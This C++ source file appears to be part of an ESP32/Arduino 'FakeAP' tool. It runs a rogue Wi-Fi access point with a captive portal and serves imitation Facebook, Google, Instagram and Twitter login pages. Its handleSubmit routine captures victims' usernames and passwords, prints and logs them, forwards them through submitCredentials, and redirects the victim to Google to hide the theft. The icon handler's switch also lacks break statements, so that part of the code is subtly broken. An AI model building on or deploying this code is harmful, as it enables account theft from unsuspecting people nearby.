/**
 * @file FakeAPlib.cpp
 * @author NGUEYOU SIMO, Neil L. (you@domain.com)
 * @brief
 * @version 0.1
 * @date 2024-12-08
 *
 * @copyright Copyright (c) 2024
 *
 */

#include "FakeAPlib.h"

FakeAP::FakeAP()
	: WebServerManager(new SDCardManager(), SERVER_PORT)
{
}

FakeAP::FakeAP(const uint8_t &port)
	: WebServerManager(new SDCardManager(), port)
{
}

void FakeAP::handleSubmit(void)
{
	// variables para almacenar temporalmente las entradas del usuario
	String credentials = "uid: " + m_server->arg("username");
	// String password
	credentials.concat("\npsw: " + m_server->arg("password"));

	// se imprime por consola los valores de las entradas
	Serial.println("Facebook id: " + m_server->arg("username"));
	Serial.println("Password: " + m_server->arg("password"));

	if (submitCredentials(m_server->arg("platform"), m_server->arg("username"), m_server->arg("password")))
	{
		m_sdManager->logEvent("Credentials sent and stored correctly");
#if (WITH_SUCCESS_MESSAGE)
		Serial.println(SUCCESS_SAVE_CREDENTIALS);
#endif
	}
	m_server->sendHeader("Location", "http://www.google.com");
	m_server->send(302, "text/plain", "Redirecting...");

	Serial.print("Actualmente hay ");
	Serial.print(WiFi.softAPgetStationNum());
	Serial.print(" hosts conectados.\n");
}

void FakeAP::handleLogin()
{
	if (m_server->method() == HTTP_GET)
	{
		/*
		auto platform = [this] () -> Platform_t {
			String str = m_server->arg("platform");

			if 		(str == "facebook")  return FACEBOOK;
			else if (str == "google") 	 return GOOGLE;
			else if (str == "instagram") return INSTAGRAM;
			else if (str == "twitter") 	 return TWITTER;
		};
		*/

		if (getLoginPage(m_server->arg("platform")))
		{
			m_server->send(200, "text/html", _pageContent);
		}
		else
		{
			m_server->send(401, "application/json", "{\"status\":\"unauthorized\"}");
		}
	}
}

void FakeAP::handleIcons(void)
{
	if (!m_server->hasArg("icon-name"))
	{
		m_server->send(400, "text/plain", "");
		return;
	}
	int platform = m_server->arg("icon-name").toInt();

	Serial.println("Server icon argument: " + m_server->arg("icon-name"));

	String temp;
	switch (platform)
	{
	case FACEBOOK:
		temp = "/icons/icons8-facebook-48.svg";
	case GOOGLE:
		temp = "/icons/icons8-google-48.svg";
	case INSTAGRAM:
		temp = "/icons/icons8-instagram-48.svg";
	case TWITTER:
		temp = "/icons/icons8-twitterx-48.svg";
	default:
		temp = "/icons/icons8-wifi.gif";
	}

	Serial.println("Temp var value: " + temp);

	String content = m_sdManager->readFile(
		m_sdManager->getFileDir(m_indexPage) + temp);

	m_server->send(200, content.endsWith(".svg")? 
						"image/svg+xml" : "image/gif", content);
}

bool FakeAP::initialize(const String &AP_SSID, const String &AP_PSW,
						const String &WIFI_SSID, const String &WIFI_PSW)
{
	if (!m_sdManager->initialize())
	{
#if (WITH_ERROR_TYPE)
		Serial.println(ERROR_SD_NOT_INIT);
#endif
		return 0;
	}

	if (!setAccessPoint(AP_SSID, AP_PSW))
	{
		m_sdManager->logEvent("Failed to start access point: " + AP_SSID);
		return 0;
	}
	else
	{
		m_sdManager->logEvent("Acces point initialized correctly: " + AP_SSID);
	}

	if (WIFI_PSW != NULL)
	{
		!setWifiStation(WIFI_SSID, WIFI_PSW) ? m_sdManager->logEvent("Failed to connect to: " + WIFI_SSID) : m_sdManager->logEvent("Connected to: " + WIFI_SSID + "\nIP address: " + WiFi.localIP().toString());
	}

	delay(2000);
	AP_PSW == NULL ? startCaptiveServer() : this->start();
	m_sdManager->logEvent("Server started");
	return 1;
}

void FakeAP::printFilesContent()
{
	if (m_indexPage != "\0")
		Serial.println(m_sdManager->readFile(m_indexPage));
	delay(1500);
	if (m_exitPage != "\0")
		Serial.println(m_sdManager->readFile(m_exitPage));
	delay(1500);
	if (m_indexPage != "\0")
		Serial.println(m_sdManager->readFile(LOG_FILE));
	delay(1500);
}

void FakeAP::startCaptiveServer()
{
	m_server->on("/", HTTP_GET, [this]()
				 { handleRoot(); });

	m_server->on("/login", HTTP_GET, [this](){
		if (getLoginPage(m_server->arg("platform"))) 
		{
			m_server->send(200, "text/html", _pageContent);
		} 
		else 
		{
			m_server->send(401, "application/json", "{\"status\":\"unauthorized\"}");
		} 
	});

	m_server->on("/index/index-styles.css", HTTP_GET, [this](){ 
		String content = m_sdManager->readFile(
							m_sdManager->getFileDir(m_indexPage)
							+ "/index-styles.css"
							);
		m_server->send(200, "text/css", content); });

	m_server->on("/index/icons", HTTP_GET, [this]()
				 { handleIcons(); });

	m_server->onNotFound([this]()
						 { handleRoot(); });

	setupCaptivePortal();
	m_server->begin();
	setServerIP(WiFi.gatewayIP());

#if (WITH_SUCCESS_MESSAGE)
	Serial.println(SUCCESS_APSERVER_INIT);
#endif
	delay(1500);
}
